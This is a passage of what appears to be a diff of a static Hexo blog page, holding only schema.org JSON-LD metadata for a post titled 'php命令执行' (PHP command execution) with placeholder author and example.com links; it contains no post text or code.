Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","wordCount":0,"datePublished":"2025-02-05T07:42:02.000Z","dateModified":"2025-04-12T01:48:00.065Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/05/php命令执行/","name":"php命令执行"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php命令执行","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","wordCount":0,"datePublished":"2025-02-05T07:42:02.000Z","dateModified":"2025-05-29T12:58:41.128Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
